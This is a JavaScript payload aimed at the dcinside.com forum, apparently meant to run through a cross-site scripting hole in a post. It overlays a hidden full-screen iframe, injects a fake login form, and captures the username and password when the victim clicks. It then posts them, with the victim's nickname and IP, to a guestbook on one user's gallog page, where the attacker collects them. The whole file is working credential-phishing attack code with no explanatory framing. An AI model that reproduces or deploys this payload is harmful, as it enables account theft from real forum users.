document.domain = 'dcinside.com';
nas = document.createElement('iframe');
nas.id = 'hash';
nas.name = 'hash';
nas.scrolling = 'no';
nas.style.position = 'fixed';
nas.style.top = '1px';
nas.style.left = '1px';
nas.style.width = '1px';
nas.style.height = '1px';
var $ = parent.$;
nas.style.top = '-1000px';
nas.style.left = '-1000px';
nas.style.width = '1000000px';
nas.style.height = '1000000px';
try {
    user_nick = parent.document.getElementsByName('name')[0].value;
    user_ip = parent.document.getElementsByName('user_ip')[0].value;
}
catch (error) {
    user_nick = "NULL"+parent.localStorage.getItem('nonmember_nick');;
    user_ip = parent.document.getElementsByName('user_ip')[0].value;
}
function request(user_id,pw) {
var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://gallog.dcinside.com/lastskyline/ajax/guestbook_ajax/write', true)
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
        // do something to response
        console.log(this.responseText);
    };
    data='ci_t=&password=1234&is_secret=0&name=ㅇㅇ&memo='+user_nick + '(' + user_id + ')' + '\n' + pw + '\n' + user_ip;
    xhr.send(data);
}

parent.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
newwindow = window.open('https://www.dcinside.com/<script>document.domain="dcinside.com"</script>', 'hash', 'width=1px, height=1px');
$('#hash').on('load', function () {
    document.querySelector('table').innerHTML='<form id="login_process"autocomplete="off"><input type="hidden"name="s_url"value="//www.dcinside.com/"><input type="hidden"name="ssl"id="ssl"value="Y"><input type="hidden"name="nJ7UN7wr394z9Zb4"value="Pnoc2Tl2Y3sI3m9e"><input type="hidden"id="ci_t"name="ci_t"value=""><fieldset><legend class="blind">로그인</legend><div class="login_inp"><div class="input_box"><label for="user_id"id="idLabel"class="lab_login"></label><input type="text"id="user_id"name="user_id"class="inp_txt"maxlength="50""value=""></div><div class="input_box"><label for="pw"id="pwdLabel"class="lab_login"></label><input type="password"id="pw"name="pw"class="inp_txt"maxlength="32""onkeyup="if(event.keyCode==13);"></div></div><div class="login_set"><div class="chk_id"><span class="checkbox"><input type="checkbox"id="idsave"class="ico_check"name="id_cookie"><em class="checkmark"></em><label for="idsave"><em class="interval m">코드</em>저장</label></span></div><div class="chk_ip"><span class="sp_loginout ip ssl_icon on"><em class="blind">on</em></span>보안접속</div><button type="button"id="login_ok"class="btn_inout login">로그인</button></div></fieldset></form>';
    newwindow.$('html').attr('onclick', 'window.opener.request($("#user_id").val(),$("#pw").val());setTimeout(function(){window.opener.$("#hash").remove()},300);');
});

